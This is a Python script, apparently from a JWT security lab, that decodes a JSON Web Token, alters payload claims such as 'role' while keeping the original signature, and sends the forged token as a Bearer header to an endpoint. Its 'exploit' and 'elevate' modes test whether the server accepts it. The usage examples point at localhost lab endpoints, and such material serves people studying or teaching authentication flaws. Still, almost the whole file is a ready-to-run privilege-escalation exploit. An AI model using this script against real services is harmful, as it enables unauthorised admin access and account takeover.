#!/usr/bin/env python3
"""
JWT Lab - Signature Bypass / Tampering Attack

This script demonstrates modifying a JWT payload without changing the signature,
exploiting endpoints that don't properly validate signatures.
"""

import jwt
import json
import base64
import sys
import requests

def decode_token(token):
    """Decode a JWT token without verifying the signature."""
    try:
        # Split the token into its parts
        parts = token.split('.')
        if len(parts) != 3:
            print("[-] Invalid token format")
            return None, None, None
        
        # Decode the header
        header_bytes = base64.urlsafe_b64decode(parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4))
        header = json.loads(header_bytes.decode('utf-8'))
        
        # Decode the payload
        payload_bytes = base64.urlsafe_b64decode(parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4))
        payload = json.loads(payload_bytes.decode('utf-8'))
        
        return header, payload, parts[2]  # Return header, payload, and signature
    
    except Exception as e:
        print(f"[-] Error decoding token: {e}")
        return None, None, None

def modify_token_payload(token, modifications):
    """Modify payload of a token without changing the signature."""
    header, payload, signature = decode_token(token)
    
    if not header or not payload or not signature:
        return None
    
    print("[*] Original payload:")
    print(json.dumps(payload, indent=2))
    
    # Apply modifications to the payload
    for key, value in modifications.items():
        payload[key] = value
    
    print("[*] Modified payload:")
    print(json.dumps(payload, indent=2))
    
    # Encode the header and modified payload
    header_bytes = json.dumps(header, separators=(',', ':')).encode('utf-8')
    header_b64 = base64.urlsafe_b64encode(header_bytes).decode('utf-8').rstrip('=')
    
    payload_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    payload_b64 = base64.urlsafe_b64encode(payload_bytes).decode('utf-8').rstrip('=')
    
    # Create modified token with original signature
    modified_token = f"{header_b64}.{payload_b64}.{signature}"
    
    return modified_token

def exploit_missing_validation(url, token, modifications):
    """Exploit the missing signature validation vulnerability."""
    if not token:
        print("[-] No token provided.")
        return False
    
    modified_token = modify_token_payload(token, modifications)
    
    if not modified_token:
        return False
    
    print(f"[+] Original token: {token}")
    print(f"[+] Modified token: {modified_token}")
    
    try:
        # Send request to the vulnerable endpoint
        headers = {"Authorization": f"Bearer {modified_token}"}
        response = requests.get(url, headers=headers)
        
        print(f"[+] Response status code: {response.status_code}")
        print(f"[+] Response body: {response.text}")
        
        if response.status_code == 200:
            print("[+] Exploit successful! The server accepted the modified token.")
            return True
        else:
            print("[-] Exploit failed. The server rejected the modified token.")
            return False
    
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        return False

def print_usage():
    print("Usage:")
    print("  1. Decode and display a JWT token:")
    print("     python signature_bypass.py decode <token>")
    print()
    print("  2. Modify a token's payload:")
    print("     python signature_bypass.py modify <token> <key> <value>")
    print("     Example: python signature_bypass.py modify <token> role admin")
    print()
    print("  3. Exploit a vulnerable endpoint:")
    print("     python signature_bypass.py exploit <url> <token> <key> <value>")
    print("     Example: python signature_bypass.py exploit http://localhost:3000/api/missing-validation <token> role admin")
    print()
    print("  4. Full attack with role elevation:")
    print("     python signature_bypass.py elevate <url> <token>")
    print("     Example: python signature_bypass.py elevate http://localhost:3000/api/missing-validation <token>")

def main():
    if len(sys.argv) < 2 or sys.argv[1] in ["-h", "--help"]:
        print_usage()
        sys.exit(1)
    
    action = sys.argv[1]
    
    if action == "decode":
        if len(sys.argv) < 3:
            print("[-] Please provide a token to decode.")
            sys.exit(1)
        
        token = sys.argv[2]
        header, payload, signature = decode_token(token)
        
        if header and payload:
            print("\nHeader:")
            print(json.dumps(header, indent=2))
            print("\nPayload:")
            print(json.dumps(payload, indent=2))
            print("\nSignature:")
            print(signature)
    
    elif action == "modify":
        if len(sys.argv) < 5:
            print("[-] Please provide a token, key, and value.")
            print("    Example: python signature_bypass.py modify <token> role admin")
            sys.exit(1)
        
        token = sys.argv[2]
        key = sys.argv[3]
        value = sys.argv[4]
        
        # Try to convert value to appropriate type
        if value.lower() == "true":
            value = True
        elif value.lower() == "false":
            value = False
        elif value.isdigit():
            value = int(value)
        
        modified_token = modify_token_payload(token, {key: value})
        
        if modified_token:
            print(f"\n[+] Modified token: {modified_token}")
    
    elif action == "exploit":
        if len(sys.argv) < 6:
            print("[-] Please provide a URL, token, key, and value.")
            print("    Example: python signature_bypass.py exploit http://localhost:3000/api/missing-validation <token> role admin")
            sys.exit(1)
        
        url = sys.argv[2]
        token = sys.argv[3]
        key = sys.argv[4]
        value = sys.argv[5]
        
        # Try to convert value to appropriate type
        if value.lower() == "true":
            value = True
        elif value.lower() == "false":
            value = False
        elif value.isdigit():
            value = int(value)
        
        exploit_missing_validation(url, token, {key: value})
    
    elif action == "elevate":
        if len(sys.argv) < 4:
            print("[-] Please provide a URL and token.")
            print("    Example: python signature_bypass.py elevate http://localhost:3000/api/missing-validation <token>")
            sys.exit(1)
        
        url = sys.argv[2]
        token = sys.argv[3]
        
        # Modify to make the user an admin
        exploit_missing_validation(url, token, {"role": "admin"})
    
    else:
        print(f"[-] Unknown action: {action}")
        print_usage()
        sys.exit(1)

if __name__ == "__main__":
    main() 